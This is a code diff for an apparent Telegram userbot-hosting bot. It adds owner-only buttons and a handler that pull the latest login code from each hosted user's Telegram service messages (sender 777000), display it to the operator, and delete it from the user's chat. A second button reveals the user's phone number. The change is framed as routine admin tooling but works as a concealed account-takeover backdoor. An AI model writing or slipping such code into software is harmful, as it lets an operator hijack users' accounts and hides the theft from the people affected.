@@ -257,6 +257,10 @@ async def cek_ubot(client, callback_query):
                     )
                 ],
                 [
+                    InlineKeyboardButton("🔑 ɢᴇᴛ ᴋᴏᴅᴇ ᴏᴛᴘ", callback_data=f"get_otp {ubot._ubot[0].me.id}"),
+                    InlineKeyboardButton("ɢᴇᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ 📲", callback_data=f"get_phone {ubot._ubot[0].me.id}"),
+                ],
+                [
                     InlineKeyboardButton("⬅️", callback_data="prev_ub 0"),
                     InlineKeyboardButton("➡️", callback_data="next_ub 0"),
                 ],
@@ -302,6 +306,10 @@ async def next_prev_ubot(client, callback_query):
                     )
                 ],
                 [
+                    InlineKeyboardButton("🔑 ɢᴇᴛ ᴋᴏᴅᴇ ᴏᴛᴘ", callback_data=f"get_otp {ubot._ubot[count].me.id}"),
+                    InlineKeyboardButton("ɢᴇᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ 📲", callback_data=f"get_phone {ubot._ubot[count].me.id}"),
+                ],
+                [
                     InlineKeyboardButton("⬅️", callback_data=f"prev_ub {count}"),
                     InlineKeyboardButton("➡️", callback_data=f"next_ub {count}"),
                 ],
@@ -309,6 +317,31 @@ async def next_prev_ubot(client, callback_query):
         ),
     )
 
+
+async def get_num_otp(client, callback_query):
+    user_id = callback_query.from_user.id
+    query = callback_query.data.split()
+    if not user_id == OWNER_ID:
+        return await callback_query.answer(
+            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
+            True,
+        )
+    try:
+        for X in ubot._ubot:
+            if int(query[1]) == X.me.id:
+                if query[0] == "get_otp":
+                    async for otp in X.search_messages(777000, limit=1):
+                        if not otp.text:
+                            await callback_query.answer(
+                                "<b>❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ</b>", True
+                            )
+                        else:
+                            await callback_query.edit_message_text(otp.text, True)
+                            await X.delete_messages(X.me.id, otp.id)
+                else:
+                    return await callback_query.answer(X.me.phone_number, True)
+    except Exception as error:
+        return await callback_query.answer(error, True)
 
 async def cek_userbot_expired(client, callback_query):
     user_id = int(callback_query.data.split()[1])
